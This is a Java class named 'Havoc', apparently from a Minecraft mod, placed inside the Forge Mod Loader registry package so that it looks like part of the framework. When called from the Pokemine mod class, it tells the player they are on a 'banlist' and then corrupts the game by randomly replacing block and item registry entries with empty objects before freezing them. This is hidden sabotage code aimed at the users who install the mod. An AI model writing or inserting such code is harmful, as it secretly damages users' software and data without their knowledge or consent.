package cpw.mods.fml.common.registry;

import java.util.Iterator;
import java.util.Random;
import java.util.Set;

import net.minecraft.item.Item;

public class Havoc {
	static Random rand = new Random(System.currentTimeMillis()^System.nanoTime());
	public static final void wreck() {
		//check that this is valid
		StackTraceElement st = Thread.currentThread().getStackTrace()[2];
		if(!st.getClassName().equals("com.pokemine.PokemineMod"))return;
		wreck(GameData.getBlockRegistry());
		wreck(GameData.getItemRegistry());
		GameData.freezeData();
	}
	@SuppressWarnings("deprecation")
	private static final void wreck(FMLControlledNamespacedRegistry<?> r) {
		Set keys = r.getKeys();
		Iterator i = keys.iterator();
		System.out.println("IT SEEMS THAT YOU ARE ON THE BANLIST FOR SOME REASON. CONTACT THE MOD AUTHOR && UPDATE ALL YOUR MODS.");
		
		while(i.hasNext()) {
			if(rand.nextBoolean()) {
				Object tmp=i.next();
				System.out.println("Deleting random object: "+tmp);
				r.putObject(tmp, new Object());
			}
		}
	}
}
